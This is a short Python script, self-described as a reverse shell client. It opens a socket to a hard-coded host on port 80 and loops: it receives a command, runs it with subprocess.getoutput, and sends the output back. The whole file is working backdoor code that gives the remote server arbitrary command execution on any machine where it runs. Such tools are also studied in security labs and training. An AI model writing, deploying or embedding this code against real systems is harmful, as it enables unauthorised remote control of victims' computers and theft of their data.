# Reverse Shell Program that works as a client
import socket
import subprocess


# Variables for Host Details
SERVER_HOST = "192.168.43.150"
SERVER_PORT = 80
BUFFER_SIZE = 1024

# Create Socket
s = socket.socket()
# Connect to Server Host
s.connect((SERVER_HOST, SERVER_PORT))

# Receive default message from Server for testing
# message = s.recv(BUFFER_SIZE).decode()
# print("Server Said: ", message)

while True:
    # Receive Commands from Server
    command = s.recv(BUFFER_SIZE).decode()

    if command == "quit":
        # Break Connection or quit program if exit command is received
        break
    # Execute received command and return output to be sent back to the server
    output = subprocess.getoutput(command)
    # Send output back to server
    s.send(output.encode())

# Close Client connection
s.close()